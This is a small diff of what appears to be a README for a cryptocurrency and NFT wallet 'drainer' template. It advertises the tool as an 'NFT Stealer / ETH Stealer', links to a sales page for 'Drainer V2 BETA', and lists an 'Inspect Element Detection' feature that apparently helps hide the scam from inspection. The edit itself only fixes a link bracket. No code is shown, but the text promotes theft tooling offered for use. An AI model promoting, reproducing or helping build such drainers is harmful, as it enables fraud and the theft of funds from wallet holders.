@@ -3,7 +3,7 @@
 
 ## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer
 
-![preview](https://media.discordapp.net/attachments/986649854728089610/987037794805354546/unknown.png?width=1261&height=610] [Drainer V2 BETA](https://cryptoscemm.sellix.io]
+![preview](https://media.discordapp.net/attachments/986649854728089610/987037794805354546/unknown.png?width=1261&height=610) [Drainer V2 BETA](https://cryptoscemm.sellix.io]
 
 ## `💡 Features`
 - [x] Inspect Element Detection
